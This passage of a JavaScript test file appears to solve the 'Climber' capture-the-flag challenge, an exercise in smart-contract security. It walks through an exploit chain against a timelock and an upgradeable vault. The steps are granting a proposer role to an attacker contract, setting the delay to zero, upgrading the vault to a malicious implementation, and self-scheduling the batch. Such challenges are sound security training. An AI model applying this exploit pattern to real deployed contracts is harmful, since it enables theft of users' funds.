...
describe("[Challenge] Climber", function () {
  ...
  it("Execution", async function () {
    ...
    const vunerableClimberImplFactory = await ethers.getContractFactory(
      "VulnerableClimber"
    );
    const vunerableClimberImpl = await vunerableClimberImplFactory.deploy();

    const createSignatureFactory = await ethers.getContractFactory(
      "CreateSignature"
    );
    const createSignature = await createSignatureFactory.deploy(
      vunerableClimberImpl.address,
      timelock.address,
      vault.address
    );

    // Give contract PROPOSER_ROLE
    let element = timelock.interface.encodeFunctionData("grantRole", [
      "0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1",
      createSignature.address,
    ...
    // Set maxDelay to 0
    element = timelock.interface.encodeFunctionData("updateDelay", [0]);

    targets.push(timelock.address);
    values.push(0);
    dataElements.push(element);

    // Upgrade vault to the VunerableClimber
    element = vault.interface.encodeFunctionData("upgradeTo", [
      vunerableClimberImpl.address,
    ]);
    ...
    element = createSignature.interface.encodeFunctionData("schedule", []);
    targets.push(createSignature.address);
    values.push(0);
    dataElements.push(element);
